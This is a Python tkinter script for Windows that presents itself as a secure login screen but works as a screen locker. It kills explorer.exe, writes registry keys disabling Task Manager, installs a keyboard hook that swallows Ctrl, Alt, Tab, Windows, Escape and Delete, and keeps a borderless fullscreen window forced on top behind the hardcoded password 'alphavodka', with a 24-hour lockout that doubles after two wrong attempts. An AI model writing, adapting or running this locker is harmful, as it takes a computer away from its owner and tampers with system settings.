import tkinter as tk
import winsound
import time
import threading
import datetime
import ctypes
import os


user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32


WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104
VK_TAB = 0x09
VK_LWIN = 0x5B
VK_RWIN = 0x5C
VK_ESCAPE = 0x1B
VK_F4 = 0x73
VK_DELETE = 0x2E
VK_CONTROL = 0x11
VK_ALT = 0x12


def low_level_keyboard_proc(nCode, wParam, lParam):
    if nCode >= 0:
        vk_code = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_ulong)).contents.value
        if wParam in (WM_KEYDOWN, WM_SYSKEYDOWN) and vk_code in (VK_TAB, VK_LWIN, VK_RWIN, VK_ESCAPE, VK_F4, VK_DELETE, VK_CONTROL, VK_ALT):
            return 1  
    return user32.CallNextHookEx(None, nCode, wParam, lParam)

def disable_system_keys():
    hook_id = user32.SetWindowsHookExA(
        WH_KEYBOARD_LL,
        low_level_keyboard_proc,
        kernel32.GetModuleHandleW(None),
        0
    )
    msg = ctypes.wintypes.MSG()
    while user32.GetMessageA(ctypes.byref(msg), 0, 0, 0):
        user32.TranslateMessage(ctypes.byref(msg))
        user32.DispatchMessageA(ctypes.byref(msg))
    user32.UnhookWindowsHookEx(hook_id)


def enforce_focus(app):
    while True:
        time.sleep(0.5)
        app.lift()
        app.attributes("-topmost", True)
        app.focus_force()


def disable_task_manager():
    os.system("taskkill /f /im explorer.exe")
    os.system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")
    os.system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")

def enable_task_manager():
    os.system("start explorer.exe")
    os.system("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /f")
    os.system("reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /f")


class SecureLogin(tk.Tk):
    def __init__(self, password):
        super().__init__()
        self.password = password
        self.user_input = ""
        self.failed_attempts = 0
        self.lockout_time = None
        self.lockout_duration = 24  

        
        self.attributes("-fullscreen", True)
        self.configure(bg='black')
        self.overrideredirect(True)  
        self.bind("<FocusOut>", self.refocus)  
        self.font_style = ('Helvetica', 36, 'bold')
        self.password_label = tk.Label(self, text="Enter Password:", font=self.font_style, fg='red', bg='black')
        self.password_label.pack(pady=20)

        self.create_keyboard()
        self.protocol("WM_DELETE_WINDOW", self.prevent_close)

    def create_keyboard(self):
        self.buttons_frame = tk.Frame(self, bg='black')
        self.buttons_frame.pack()

        keys = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
                "A", "B", "C", "D", "E", "F", "G", "H", "I", "J",
                "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T",
                "U", "V", "W", "X", "Y", "Z", "Clear", "Submit"]

        for i, key in enumerate(keys):
            btn = tk.Button(self.buttons_frame, text=key, font=self.font_style, width=4, height=2,
                            command=lambda k=key: self.on_key_press(k),
                            bg='red', fg='black')
            btn.grid(row=i // 10, column=i % 10, padx=5, pady=5)

    def on_key_press(self, key):
        winsound.Beep(2000, 100)  

        if self.lockout_time and datetime.datetime.now() < self.lockout_time:
            self.update_lockout_display()
            return

        if key == "Clear":
            self.user_input = ""
        elif key == "Submit":
            if self.user_input == self.password:
                self.password_label.config(text="Access Granted", fg='green')
                enable_task_manager()
                self.after(1000, self.destroy) 
            else:
                self.failed_attempts += 1
                if self.failed_attempts == 1:
                    self.password_label.config(text="Incorrect! Only 1 attempt left!", fg='yellow')
                    threading.Thread(target=self.play_warning_sound, daemon=True).start()
                elif self.failed_attempts >= 2:
                    self.start_lockout()
                else:
                    self.password_label.config(text="Incorrect Password!", fg='red')
        else:
            self.user_input += key

        self.password_label.config(text=f"Enter Password: {self.user_input}")

    def play_warning_sound(self):
        for _ in range(5):
            winsound.Beep(500, 1000)
            time.sleep(1)

    def start_lockout(self):
        self.lockout_time = datetime.datetime.now() + datetime.timedelta(hours=self.lockout_duration)
        self.password_label.config(text=f"Locked for {self.lockout_duration} hours", fg='red')
        threading.Thread(target=self.countdown_timer, daemon=True).start()
        self.lockout_duration *= 2  # Double the lockout time

    def countdown_timer(self):
        while datetime.datetime.now() < self.lockout_time:
            remaining_time = self.lockout_time - datetime.datetime.now()
            hours, remainder = divmod(remaining_time.total_seconds(), 3600)
            minutes, seconds = divmod(remainder, 60)
            self.password_label.config(text=f"Locked for {int(hours)}h {int(minutes)}m {int(seconds)}s", fg='red')
            time.sleep(1)

    def prevent_close(self):
        pass  

    def refocus(self, event=None):
        self.lift()
        self.attributes("-topmost", True)
        self.focus_force()

    def update_lockout_display(self):
        remaining_time = self.lockout_time - datetime.datetime.now()
        hours, remainder = divmod(remaining_time.total_seconds(), 3600)
        minutes, seconds = divmod(remainder, 60)
        self.password_label.config(text=f"Locked for {int(hours)}h {int(minutes)}m {int(seconds)}s", fg='red')

    def run(self):
        threading.Thread(target=enforce_focus, args=(self,), daemon=True).start()
        self.mainloop()

def main():
    disable_task_manager()
    threading.Thread(target=disable_system_keys, daemon=True).start()
    SecureLogin("alphavodka").run()

if __name__ == "__main__":
    main()
